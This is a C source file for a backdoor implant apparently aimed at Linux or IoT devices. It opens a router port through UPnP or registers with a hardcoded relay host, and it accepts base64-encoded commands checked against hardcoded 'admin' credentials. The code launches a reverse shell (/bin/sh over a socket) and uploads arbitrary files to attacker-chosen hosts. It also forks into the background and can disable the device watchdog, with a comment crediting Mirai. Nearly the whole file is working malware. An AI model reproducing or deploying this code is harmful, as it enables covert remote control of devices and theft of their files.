#include "x41.h"
#include "network/getlocalhost.h"
#include "network/ip_address_resolut.h"
#include <arpa/inet.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdio.h>
#include <string.h>

////////////////////////
// session config
#define SESSION_PORT 41444

#define RELAY_SESSION_HOST "192.168.2.106"
#define RELAY_SESSION_PORT 41222

#define PASS "admin"
#define USER "admin"

#define RELAY_SESSION_UPDATE_TIME 600 
///////////////////////

pid_t pid_door, cp;
pthread_t T;
pthread_t UPDATE_THREAD;

int udp_dst_port = 0;
char *relay_session_result; 
bool relay_server_update_cancel = false;

char enc[BASE64_BUF]; // for encode in base64 buffor 
char dec[BASE64_BUF]; // for decode in base64 buffor

static int decode_base64_to_6bit(int c)
{
  if (c >= 'A' && c <= 'Z') {
    return c - 'A';
  } else if (c >= 'a' && c <= 'z') {
    return c - 'a' + 26;
  } else if (c >= '0' && c <= '9') {
    return c - '0' + 52;
  } else if (c == '+') {
    return 62;
  } else if (c == '/') {
    return 63;
  } else if (c == '=') {
    return 0;
  } else {
	return -1;
  }
}
 
static char *decode_base64(char *src)
{
  unsigned int o[4];
  char *p = dec;
  size_t i;
 
  for (i = 0; src[i]; i += 4) {
	if(decode_base64_to_6bit(src[i]) < 0) return NULL;
    o[0] = decode_base64_to_6bit(src[i]);
    o[1] = decode_base64_to_6bit(src[i + 1]);
    o[2] = decode_base64_to_6bit(src[i + 2]);
    o[3] = decode_base64_to_6bit(src[i + 3]);
 
    *p++ = (o[0] << 2) | ((o[1] & 0x30) >> 4);
    *p++ = ((o[1] & 0xf) << 4) | ((o[2] & 0x3c) >> 2);
    *p++ = ((o[2] & 0x3) << 6) | (o[3] & 0x3f);
  }
 
  *p = '\0';
  
  return dec;
}

// file upload unit
static int upload(char *rhost, int rport, char *filename) {
	
	puts("[*]upload_run");
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if (sockfd < 0) {
	exit(42);
  }

  struct sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_port = htons(rport);
  addr.sin_addr.s_addr = inet_addr(rhost);
  if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
	  //perror("connect error");
	//close(sockfd);
	exit(42);
  }

  FILE *fp = fopen(filename, "rb");
  if (fp == NULL) {
	close(sockfd);
	exit(42);
  }

  char buf[1024];
  ssize_t len;
  while ((len = fread(buf, 1, sizeof(buf), fp)) > 0) {
    if (send(sockfd, buf, len, 0) < 0) {
      break;
    }
  }

  fclose(fp);
  close(sockfd);

  exit(42);
}



static int tag_format_parse(char* body, char *name, char *resolve, size_t buf_size){

	char *start_tag = (char*)malloc(sizeof(char) * (strlen(name) + 16));
	char *end_tag = (char*)malloc(sizeof(char) * (strlen(name) + 16));
	char *r= (char*)malloc(sizeof(char) * strlen(body) + 32);
	char *str_str;
	char *str_end;
	
	size_t len;

	if(start_tag == NULL && end_tag ==NULL && r == NULL) return -3;
	strcpy(r, body);

	sprintf(start_tag, "<%s>",name);
	sprintf(end_tag, "</%s>",name);
	
	if((str_str = strstr(r, start_tag)) != NULL \
		&& (str_end = strstr(r, end_tag)) != NULL){
		str_str = &str_str[strlen(start_tag)];
	}else{
		free(start_tag);
		free(end_tag);
		free(r);
		return -1;
	}
	
	len = sizeof(char)*strlen(str_end);
	memset(strstr(str_str, end_tag),0, len);
	
	if(strlen(str_str) < buf_size){
		strcpy(resolve, str_str);
	}else{

		free(start_tag);
		free(end_tag);
		free(r);
		return -3;
	}
	
	free(start_tag);
	free(end_tag);
	free(r);
	
	return 0;
}


// the following algorrithm provides a reverse shell 
static int door(char *rhost, int rport){
	struct sockaddr_in Door;
	int door_sock;
		
	// execution in command
	char *argv[] = {"/bin/sh", NULL};
	
	memset(&Door, 0, sizeof(Door));

	door_sock = socket(AF_INET, SOCK_STREAM, 0);
	if(door_sock < 0){
		memset(&Door, 0, sizeof(Door));
		exit(42);
	}
	
	Door.sin_family =AF_INET;
	Door.sin_port = htons(rport);
	Door.sin_addr.s_addr = inet_addr(rhost);
	
	if(connect(door_sock,(struct sockaddr * )&Door, sizeof(struct sockaddr)) < 0){
		close(door_sock);
		memset(&Door, 0, sizeof(Door));
		exit(42);		
	}else{
		dup2(door_sock, 0);
		dup2(door_sock, 1);
		dup2(door_sock, 2);
		execve(argv[0], argv, NULL);
		memset(&Door, 0, sizeof(Door));
		close(door_sock);
		exit(42);
	}
}

// pthread watching 
static void* waitng(){
	int status;
	pthread_detach(T);
	// if the process terminates 
	pid_door = wait(&status);
	return 0;
}

// socket recv timewatch
static int SockTimeout(int sockfd,int sec, int usec)
{
	struct timeval tv;
	fd_set readfds;
	
	tv.tv_sec = sec;
	tv.tv_usec = usec;
	
	FD_ZERO(&readfds);
	FD_SET(sockfd, &readfds);

	return select(sockfd + 0x01, &readfds, NULL, NULL, &tv);
};

static int GetUdpDstPort(int sock){
		struct sockaddr_in res_addr;
		memset(&res_addr, 0, sizeof(res_addr));
		socklen_t len = sizeof(res_addr);
		getsockname(sock, (struct sockaddr *)&res_addr, &len);
		
		return htons(res_addr.sin_port);
}

// update relay session config
static void *relay_session_update(){
	pthread_detach(UPDATE_THREAD);

	struct sockaddr_in update_addr;
	int socket_fd;
	socket_fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(socket_fd < 0){
		// restart time
		exit(42);		
	}

	do{
	// update intarval time 	
	memset(&update_addr, 0, sizeof(update_addr));
	sleep(RELAY_SESSION_UPDATE_TIME);
	if(relay_server_update_cancel) continue;
	//puts("update !!");

	char *new_relay_session_reslut = IPAddressResolve(RELAY_SESSION_HOST);
	char *localhsot = GetLocalIPAddress();
	
	if(localhsot == NULL){
		// restart time
		sleep(10);
		continue;
	}
	
	if(strcmp(relay_session_result, new_relay_session_reslut) == 0){}
	
	memset(&update_addr, 0, sizeof(update_addr));
	update_addr.sin_family = AF_INET;
	update_addr.sin_addr.s_addr = inet_addr(localhsot);
	update_addr.sin_port = htons(udp_dst_port);
	
	if(sendto(socket_fd, RELAY_SERVER_UPDATE_CODE, strlen(RELAY_SERVER_UPDATE_CODE), 
				0, (struct sockaddr *)&update_addr, sizeof(update_addr)) < 0){
		// restart time
		sleep(10);
		continue;
	};
	
	}while(true);
	
	return 0;
}

#define ITEM_DOOR_TAG		"DOOR"
#define ITEM_PASS_TAG		"PASS"
#define ITEM_USER_TAG		"USER"
#define ITEM_HOST_TAG		"HOST"
#define ITEM_PORT_TAG		"PORT"
#define ITEM_CP_TAG			"CP"
#define ITEM_FILENAME_TAG	"FILENAME"
#define ITEM_UPDATE_TAG		"UPDATE"
#define ITEM_ACC_KEEPALIVE  "ACC_KEEPALIVE"


static void door_session(bool nat_type){	
	
	struct DOOR_SESISON set;
	char *pass = PASS;			// authentication password 
	char *user = USER;			// authentication username
	
	struct sockaddr_in addr;
	struct sockaddr_in senderinfo;
	socklen_t size;
	int socket_udp;
	
	bool relay_server_update_bool = true;
	
	do{ // session loop
	memset(&addr, 0, sizeof(addr));
	memset(&senderinfo, 0, sizeof(senderinfo));

	socket_udp = socket(AF_INET, SOCK_DGRAM, 0);
	if(socket_udp < 0){
		return;
	}
	addr.sin_family = AF_INET;
		
	if(nat_type)
	{
		addr.sin_port = htons(SESSION_PORT);
		addr.sin_addr.s_addr = INADDR_ANY;
		if(bind(socket_udp, (struct sockaddr *)&addr, sizeof(addr)) < 0) return;
		
	}else
	{   
		// relay server quey
		do{ // relay session config loop
			
		int time_set = 0;
		
		char relay_server_res_buf[RELAY_SERVER_RES_BUF];
		char relay_bind_bool_valu[RELAY_BIND_BOOL_BUF];

		memset(relay_server_res_buf, 0, RELAY_SERVER_RES_BUF);
		memset(relay_bind_bool_valu, 0 , RELAY_BIND_BOOL_BUF);
		memset(&set, 0, sizeof(set));

		relay_session_result = IPAddressResolve(RELAY_SESSION_HOST);
		if(relay_session_result == NULL) return;
		
		addr.sin_port = htons(RELAY_SESSION_PORT);
		addr.sin_addr.s_addr = inet_addr(relay_session_result);	
		if(sendto(socket_udp, 
					BIND_PORT0_REQUEST, 
					strlen(BIND_PORT0_REQUEST), 
					0,
					(struct sockaddr *)&addr, sizeof(addr)) < 0)
		{
			return;		
		}
		
		udp_dst_port = GetUdpDstPort(socket_udp);
			
		time_set = SockTimeout(socket_udp, 5, 0);
		// if timeout 
		if(time_set == 0){
			// revival time
			//puts("break 1");
			sleep(5);
			continue;
		}

		recv(socket_udp, set.buf, sizeof(set.buf), 0);
		char *relay_session_response_decode_msg = decode_base64(set.buf);
		printf("response msg : %s\n", relay_session_response_decode_msg);
		if(relay_session_response_decode_msg == NULL){
			// revival time
			//puts("break 2");
			sleep(5);
			continue;
		}
		// parse
		if(tag_format_parse(relay_session_response_decode_msg, 
				"BIND", relay_server_res_buf, RELAY_SERVER_RES_BUF) == 0
			&& tag_format_parse(relay_server_res_buf, 
				"RES", relay_bind_bool_valu, RELAY_BIND_BOOL_BUF) == 0
			&& strcmp(relay_bind_bool_valu, "true") == 0)
		{   
			// relay bind completed
			//puts("completed!!");
				
			if(relay_server_update_bool){
				int update_t = pthread_create(&UPDATE_THREAD, NULL, relay_session_update, NULL);
				if(update_t != 0){
					// if pthread  create error
					// restart process
					continue;
				}
			}
			
			relay_server_update_bool = false;
			relay_server_update_cancel = false;
			
			break;
		}
			
		// revival time
		//puts("break 3");
		sleep(5);
		}while(true);
	}

	while(1){
		// reset
		memset(&set, 0, sizeof(set));
		size = sizeof(senderinfo);
		//memset(set.buf, 0, sizeof(set.buf));
		recvfrom(socket_udp, set.buf, sizeof(set.buf) - 1, 0,
				(struct sockaddr *)&senderinfo, &size);
		
		if(nat_type){
			// alive response message
			sendto(socket_udp, set.buf, sizeof(set.buf),
					0, (struct sockaddr *)&senderinfo, size);
		}

		// encode data to decode
		set.decode_body = decode_base64(set.buf);
		printf("decode body : %s\n", set.decode_body);
		// check in base64 format for buffer text
		if(set.decode_body != NULL){
			// msg parser
			if(tag_format_parse(set.decode_body, ITEM_DOOR_TAG,set.valus, sizeof(set.valus)) == 0
					&& tag_format_parse(set.valus, ITEM_PASS_TAG, set.set_pass, sizeof(set.set_pass)) == 0
					&& tag_format_parse(set.valus, ITEM_USER_TAG, set.set_user, sizeof(set.set_user)) == 0
					&& strcmp(pass,set.set_pass) == 0 
					&& strcmp(user, set.set_user) == 0 
					&& tag_format_parse(set.valus ,ITEM_HOST_TAG, set.host, sizeof(set.host)) == 0
					&& tag_format_parse(set.valus, ITEM_PORT_TAG, set.port, sizeof(set.port)) == 0
					&& sscanf(set.port, "%hd", &set.port_s) == 1){
				//generate fork
				pid_door = fork();
				switch(pid_door){
					case 0:
						// run to with if correct authentication info
						door(set.host, set.port_s);
				}
				// wait in reverse sehll finish
				pthread_create(&T, NULL, waitng, NULL);

			}else if(tag_format_parse(set.decode_body, ITEM_CP_TAG, set.valus, sizeof(set.valus)) == 0
					  && tag_format_parse(set.valus, ITEM_PASS_TAG, set.set_pass, sizeof(set.set_pass)) == 0
					  && tag_format_parse(set.valus, ITEM_USER_TAG, set.set_user, sizeof(set.set_user)) == 0
					  && strcmp(pass, set.set_pass) == 0
					  && strcmp(user, set.set_user) == 0
					  && tag_format_parse(set.valus ,ITEM_HOST_TAG, set.host, sizeof(set.host))  == 0
					  && tag_format_parse(set.valus, ITEM_PORT_TAG, set.port, sizeof(set.port)) == 0
					  && tag_format_parse(set.valus, ITEM_FILENAME_TAG, set.filename, sizeof(set.filename)) == 0
					  && sscanf(set.port, "%hd", &set.port_s) == 1){
				// generate fork 
				cp = fork();
				switch(cp){
					case 0:
						upload(set.host, set.port_s , set.filename);
				}
				pthread_create(&T, NULL, waitng, NULL);
			

			// if nat conf false
			}else if(!nat_type){
				// relay_session update 
				if(tag_format_parse(set.decode_body, ITEM_UPDATE_TAG,set.valus, sizeof(set.valus)) == 0){
					// reset session
					relay_server_update_cancel = true;
					close(socket_udp);
					break;
				}else if(tag_format_parse(set.decode_body, ITEM_ACC_KEEPALIVE, set.valus, sizeof(set.valus)) == 0){
					// resposne  
					sendto(socket_udp, set.buf, strlen(set.buf), 0, (struct sockaddr *)&addr, sizeof(addr));
				}
			}
		}
		
		// anti dos
		sleep(1);
	}}while(true); // session loop
	
	close(socket_udp);	
	return;
}

static bool nat_config(void){
	char *localhost = GetLocalIPAddress();
	if(localhost == NULL){
		return false;
	}
	
	int port_mapping_status = AddPortMapping(SESSION_PORT, 
			SESSION_PORT, localhost, "UDP", 0, "d1");

	if(port_mapping_status < 0){
		return false;
	}
	
	return true;
}

int main(void){
	bool nat_status;
	// generate fork
	nat_status = nat_config();
	
#ifdef  TEST
	door_session(nat_status);
#else

	// generate fork
	pid_t pid_d;
	pid_d = fork();
		
	// watchdog invalid 
	// by MIRAI
#ifdef KILL_WATCHDOG
	int wfd;
	if((wfd = open("/dev/watchdog", 2)) != -1 ||
        (wfd = open("/dev/misc/watchdog", 2)) != -1){
        int one = 1;
		// HeartBeat 0x80045704 & 0x80045705
        ioctl(wfd, 0x80045704, &one);
        close(wfd);
        wfd = 0;
    };
#endif
			
	switch(pid_d){
		case 0:
			puts("run");
			// if there is no proble, whih the fork run
			door_session(nat_status);
			return 0;
	}
#endif // TEST 
	return 0;
}


